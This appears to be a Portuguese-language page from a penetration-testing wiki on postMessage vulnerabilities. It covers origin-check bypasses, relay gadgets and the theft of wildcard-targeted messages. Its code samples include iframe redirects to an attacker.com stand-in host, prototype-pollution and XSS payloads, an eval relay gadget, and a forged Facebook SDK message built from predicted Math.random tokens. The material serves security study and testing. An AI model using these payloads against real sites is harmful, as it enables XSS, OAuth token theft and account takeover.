# PostMessage Vulnerabilities

{{#include ../../banners/hacktricks-training.md}}

## Enviar **PostMessage**

**PostMessage** usa a seguinte função para enviar uma mensagem:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\
No **segundo cenário**, a **mensagem só pode ser enviada para esse domínio** (mesmo que a origin do Window object seja diferente).\
Se o **wildcard** for usado, **as mensagens podem ser enviadas para qualquer domínio**, e serão enviadas para a origin do Window object.

### Atacando iframe & wildcard em **targetOrigin**

Como explicado em [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) se você encontrar uma página que possa ser **iframed** (sem proteção `X-Frame-Header`) e que esteja **enviando mensagem sensível** via **postMessage** usando um **wildcard** (\*), você pode **modificar** a **origin** do **iframe** e **leak** a mensagem **sensível** para um domínio controlado por você.\
Observe que se a página puder ser iframed mas o **targetOrigin** estiver **configurado para uma URL e não para um wildcard**, este **truque não funcionará**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** é a função usada pelo JS para declarar a função que está **esperando `postMessages`**.\
Um código semelhante ao seguinte será usado:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note neste caso como a **primeira coisa** que o código faz é **verificar o origin**. Isso é extremamente **importante**, principalmente se a página for fazer **algo sensível** com a informação recebida (como trocar uma password). **Se não verificar o origin, atacantes podem fazer vítimas enviarem dados arbitrários para esses endpoints** e alterar as senhas das vítimas (neste exemplo).

### Enumeration

Para **encontrar event listeners** na página atual você pode:

- **Procurar** no código JS por `window.addEventListener` e `$(window).on` (_versão JQuery_)
- **Executar** nas devtools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Ir para** _Elements --> Event Listeners_ nas devtools do browser

![](<../../images/image (396).png>)

- Usar uma **extensão do navegador** como [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ou [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Essas extensões vão **interceptar todas as mensagens** e mostrá-las para você.

### Origin check bypasses

- O atributo **`event.isTrusted`** é considerado seguro porque retorna `True` apenas para eventos gerados por ações genuínas do usuário. Embora seja difícil de contornar se implementado corretamente, sua importância nas checagens de segurança é notável.
- O uso de **`indexOf()`** para validação de origin em eventos PostMessage pode ser suscetível a bypass. Um exemplo que ilustra essa vulnerabilidade é:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- O método **`search()`** de `String.prototype.search()` é destinado a expressões regulares, não strings. Passar qualquer coisa que não seja um regexp leva à conversão implícita para regex, tornando o método potencialmente inseguro. Isso porque em regex um ponto (.) age como coringa, permitindo contornos da validação com domínios especialmente construídos. Por exemplo:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- A função **`match()`**, similar a `search()`, processa regex. Se a regex estiver mal estruturada, pode ser sujeita a bypass.
- A função **`escapeHtml`** tem a intenção de sanitizar entradas escapando caracteres. No entanto, ela não cria um novo objeto escapado — sobrescreve as propriedades do objeto existente. Esse comportamento pode ser explorado. Particularmente, se um objeto puder ser manipulado de modo que sua propriedade controlada não reconheça `hasOwnProperty`, o `escapeHtml` não funcionará como esperado. Isso é demonstrado nos exemplos abaixo:

- Falha esperada:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Contornando o escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

No contexto dessa vulnerabilidade, o objeto `File` é notavelmente explorável devido à sua propriedade somente leitura `name`. Essa propriedade, quando usada em templates, não é sanitizada pela função `escapeHtml`, levando a potenciais riscos de segurança.

- A propriedade `document.domain` em JavaScript pode ser definida por um script para encurtar o domínio, permitindo uma política de mesma origem mais relaxada dentro do mesmo domínio pai.

### Origin-only trust + trusted relays

Se um receiver apenas verifica **`event.origin`** (por exemplo, confia em qualquer `*.trusted.com`) você frequentemente pode encontrar uma página **"relay"** nesse origin que ecoa params controlados pelo atacante via `postMessage` para um `targetOrigin`/`targetWindow` fornecido. Exemplos incluem gadgets de marketing/analytics que pegam query params e encaminham `{msg_type, access_token, ...}` para `opener`/`parent`. Você pode:

- **Abrir a página da vítima em um popup/iframe que tenha um `opener`** para que seus handlers sejam registrados (muitos pixels/SDKs só anexam listeners quando `window.opener` existe).
- **Navegar outra janela atacante até o endpoint relay no origin confiável**, populando os campos da mensagem que você quer injetar (message type, tokens, nonces).
- Como a mensagem agora vem **do origin confiável**, a validação apenas por origin passa e você pode acionar comportamentos privilegiados (mudanças de estado, chamadas a APIs, escritas no DOM) no listener da vítima.

Padrões de abuso vistos em produção:

- Analytics SDKs (ex.: pixel/fbevents-style) consomem mensagens como `FACEBOOK_IWL_BOOTSTRAP`, então **chamam backend APIs usando um token fornecido na mensagem** e incluem **`location.href` / `document.referrer`** no corpo da requisição. Se você fornecer seu próprio token, pode **ler essas requisições no histórico/logs de requests do token** e exfil **OAuth codes/tokens** presentes na URL/referrer da página da vítima.
- Qualquer relay que reflita campos arbitrários em `postMessage` permite que você **falsifique (spoof) tipos de mensagem** esperados por listeners privilegiados. Combine com validação de input fraca para alcançar chamadas Graph/REST, desbloqueio de funcionalidades ou fluxos equivalentes a CSRF.

Dicas de caça: enumere `postMessage` listeners que só checam `event.origin`, então procure por **endpoints HTML/JS same-origin que encaminhem params de URL via `postMessage`** (previews de marketing, popups de login, páginas de erro OAuth). Conecte ambos com `window.open()` + `postMessage` para contornar checagens de origin.

### e.origin == window.origin bypass

Ao embutir uma página web dentro de um **sandboxed iframe** usando %%%%%%, é crucial entender que o origin do iframe será definido como null. Isso é particularmente importante ao lidar com atributos sandbox e suas implicações na segurança e funcionalidade.

Ao especificar **`allow-popups`** no atributo sandbox, qualquer popup aberto de dentro do iframe herda as restrições de sandbox do seu pai. Isso significa que, a menos que o atributo **`allow-popups-to-escape-sandbox`** também seja incluído, o origin do popup também será definido como `null`, alinhando-se com o origin do iframe.

Consequentemente, quando um popup é aberto nessas condições e uma mensagem é enviada do iframe para o popup usando **`postMessage`**, ambas as pontas—remetente e receptor—terão seus origins definidos como `null`. Isso leva a uma situação onde **`e.origin == window.origin`** avalia como true (`null == null`), porque tanto o iframe quanto o popup compartilham o mesmo valor de origin `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

É possível verificar se a mensagem veio da mesma window onde o script está escutando (especialmente interessante para **Content Scripts from browser extensions** checarem se a mensagem foi enviada da mesma página):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Você pode forçar **`e.source`** de uma mensagem a ser nulo criando um **iframe** que **envia** o **postMessage** e é **imediatamente excluído**.

Para mais informações **leia:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Para realizar esses ataques, idealmente você deverá conseguir **colocar a página web da vítima** dentro de um `iframe`. Mas alguns headers como `X-Frame-Header` podem **impedir** esse **comportamento**.\
Nesses cenários você ainda pode usar um ataque menos furtivo. Você pode abrir uma nova aba para a aplicação web vulnerável e comunicar-se com ela:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Roubando mensagem enviada para o iframe filho bloqueando a página principal

Na página a seguir você pode ver como é possível roubar **dados sensíveis via postmessage** enviados para um **iframe filho** ao **bloquear** a página **principal** antes do envio dos dados e abusar de um **XSS no filho** para **leak** os dados antes de serem recebidos:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Roubando mensagem modificando o location do iframe

Se você consegue iframar uma webpage sem X-Frame-Header que contenha outro iframe, você pode **mudar o location desse iframe filho**, então se ele estiver recebendo um **postmessage** enviado usando um **wildcard**, um atacante poderia **mudar** o **origin** desse iframe para uma página **controlada** por ele e **roubar** a mensagem:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

Em cenários onde os dados enviados via `postMessage` são executados por JS, você pode **iframe** a **page** e **explorar** a **Prototype Pollution/XSS** enviando o exploit via `postMessage`.

A couple of **very good explained XSS though `postMessage`** can be found in [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Exemplo de um exploit para abusar de **Prototype Pollution e depois XSS** através de um `postMessage` para um `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Para **mais informações**:

- Link para a página sobre [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link para a página sobre [**XSS**](../xss-cross-site-scripting/index.html)
- Link para a página sobre [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### A allowlist de origens confiáveis não é uma barreira

Uma verificação estrita de `event.origin` só funciona se a **origem confiável não puder executar JS do atacante**. Quando páginas privilegiadas embutem iframes de terceiros e assumem que `event.origin === "https://partner.com"` é seguro, qualquer XSS em `partner.com` se torna uma ponte para a página pai:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Padrão de ataque observado no mundo real:

1. **Exploit XSS no iframe do parceiro** e drop a relay gadget para que qualquer `postMessage` se torne code exec dentro da origem confiável:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **Da página attacker**, envie JS para o iframe comprometido que encaminha um tipo de mensagem permitido de volta para o parent. A mensagem se origina de `partner.com`, passa pela allowlist e carrega HTML que é inserido de forma insegura:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. O parent injeta o HTML do atacante, dando **JS execution in the parent origin** (e.g., `facebook.com`), que pode então ser usado para roubar OAuth codes ou pivotar para fluxos de takeover completo de conta.

Key takeaways:

- **A origem do parceiro não é uma fronteira**: qualquer XSS em um parceiro "confiável" permite que atacantes enviem mensagens permitidas que contornam checagens de `event.origin`.
- Handlers que **renderizam payloads controlados pelo parceiro** (por exemplo, `innerHTML` em tipos de mensagem específicos) transformam o comprometimento do parceiro em um DOM XSS de mesma origem.
- Uma ampla **superfície de mensagens** (muitos tipos, sem validação de estrutura) fornece mais gadgets para pivotar uma vez que um iframe parceiro seja comprometido.

### Predizendo **`Math.random()`** callback tokens em postMessage bridges

Quando a validação de mensagens usa um “shared secret” gerado com `Math.random()` (e.g., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) e o mesmo helper também nomeia plugin iframes, você pode recuperar saídas do PRNG e forjar mensagens confiáveis:

- **Leak PRNG outputs via `window.name`:** O SDK auto-nomeia plugin iframes com `guid()`. Se você controla o frame superior, coloque a página da vítima em um iframe, depois navegue o plugin iframe para sua origem (e.g., `window.frames[0].frames[0].location='https://attacker.com'`) e leia `window.frames[0].frames[0].name` para obter uma saída bruta de `Math.random()`.
- **Force more outputs without reloads:** Alguns SDKs expõem um caminho de reinit; no FB SDK, disparar `init:post` com `{xfbml:1}` força `XFBML.parse()`, destrói/recria o plugin iframe e gera novos nomes/IDs de callback. Reinit repetido produz quantas saídas do PRNG forem necessárias (note chamadas internas extras de `Math.random()` para IDs de callback/iframe, então quem resolver precisa pular valores intermediários).
- **Trusted-origin delivery via parameter pollution:** Se um endpoint de plugin first-party reflete um parâmetro não sanitizado no payload cross-window (e.g., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), você pode injetar `&type=...&iconSVG=...` preservando a origem confiável `facebook.com`.
- **Predict the next callback:** Converta nomes de iframe leakados de volta para floats em `[0,1)` e alimente vários valores (mesmo não consecutivos) em um preditor de `Math.random` do V8 (e.g., baseado em Z3). Gere o próximo `guid()` localmente para forjar o token de callback esperado.
- **Trigger the sink:** Construa os dados do postMessage de forma que a bridge dispare `xd.mpn.setupIconIframe` e injete HTML em `iconSVG` (e.g., URL-encoded `<img src=x onerror=...>`), alcançando DOM XSS dentro da origem hospedeira; a partir daí, iframes de mesma origem (OAuth dialogs, arbiters, etc.) podem ser lidos.
- **Framing quirks help:** A cadeia requer framing. Em algumas webviews mobile, `X-Frame-Options` pode degradar para o não suportado `ALLOW-FROM` quando `frame-ancestors` está presente, e parâmetros de “compat” podem forçar `frame-ancestors` permissivos, habilitando o canal lateral `window.name`.

#### Exemplo mínimo de mensagem forjada
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referências

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Para praticar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
